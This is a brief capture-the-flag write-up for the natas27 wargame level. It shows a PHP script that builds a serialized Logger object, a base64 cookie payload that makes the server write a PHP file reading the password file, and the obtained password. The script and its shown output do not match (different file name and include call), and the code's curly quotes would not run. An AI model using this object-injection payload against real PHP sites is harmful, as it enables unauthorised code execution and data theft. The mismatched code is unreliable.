# natas27

PHP Object Injection
Build a php and execute:

```php
<?php
class Logger{
private $logFile;
private $initMsg;
private $exitMsg;
function __construct(){
// initialise variables
$this->initMsg=”#–session started–#\n”;
$this->exitMsg=”<?php include_once(‘/etc/natas_webpass/natas27’);?>”;
$this->logFile = “img/output.php”;
}
}
$output[]=new Logger();
echo base64_encode(serialize($output));
?>
```

Note: try to make the output base64_encoded string clean from “=”, otherwise it may not be accepted

Output String:
YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL3doYXRpc2l0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDY6Ijw/cGhwIGluY2x1ZGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO319

Then send this string as “drawing” in the Cookie. It would be unserialized by the server and regarded as a Logger. On destruct function (automatically executed), it will write a php to show the password file.

Password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
